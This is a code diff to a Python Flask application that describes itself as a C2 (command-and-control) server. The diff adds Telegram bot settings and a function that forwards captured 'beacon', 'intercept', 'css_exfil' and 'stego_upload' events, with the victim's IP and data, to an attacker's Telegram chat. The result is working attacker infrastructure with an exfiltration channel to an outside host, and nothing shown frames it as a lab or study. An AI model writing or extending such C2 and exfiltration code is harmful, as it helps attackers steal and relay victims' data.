@@ -11,6 +11,7 @@ from datetime import datetime, timezone
 from pathlib import Path
 from typing import Optional
 import json
+import requests
 import hashlib
 import os
 import logging
@@ -21,6 +22,8 @@ def create_app(
     auth_key: Optional[str] = None,
     log_file: Optional[Path] = None,
     payload_dir: Optional[Path] = None,
+    telegram_bot_token: Optional[str] = None,
+    telegram_chat_id: Optional[str] = None,
 ) -> Flask:
     """
     Create and configure the Flask C2 application.
@@ -38,6 +41,8 @@ def create_app(
     app.config['AUTH_KEY'] = auth_key
     app.config['LOG_FILE'] = log_file or Path('c2_logs.json')
     app.config['PAYLOAD_DIR'] = payload_dir or Path(__file__).parent.parent.parent
+    app.config['TELEGRAM_BOT_TOKEN'] = telegram_bot_token or os.getenv('TELEGRAM_BOT_TOKEN')
+    app.config['TELEGRAM_CHAT_ID'] = telegram_chat_id or os.getenv('TELEGRAM_CHAT_ID')
     
     # Rate Limiting
     limiter = Limiter(
@@ -59,6 +64,20 @@ def create_app(
     
     # --- Logging ---
     
+    def send_telegram_notification(event_type: str, ip: str, data: dict):
+        bot_token = app.config.get('TELEGRAM_BOT_TOKEN')
+        chat_id = app.config.get('TELEGRAM_CHAT_ID')
+        if not bot_token or not chat_id:
+            return
+            
+        try:
+            url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+            text = f"🟢 *New {event_type.title()} Data*\n*IP:* `{ip}`\n```json\n{json.dumps(data, indent=2)[:3500]}\n```"
+            payload = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
+            requests.post(url, json=payload, timeout=5)
+        except Exception as e:
+            app.logger.error(f'Telegram error: {e}')
+
     def log_event(event_type: str, data: dict):
         """Log an event to the log file."""
         entry = {
@@ -70,6 +89,11 @@ def create_app(
         try:
             with open(app.config['LOG_FILE'], 'a') as f:
                 f.write(json.dumps(entry) + '\n')
+            
+            # Send Telegram notification for data events
+            if event_type in ('beacon', 'intercept', 'css_exfil', 'stego_upload'):
+                send_telegram_notification(event_type, request.remote_addr, data)
+                
         except Exception as e:
             app.logger.error(f'Log error: {e}')
     
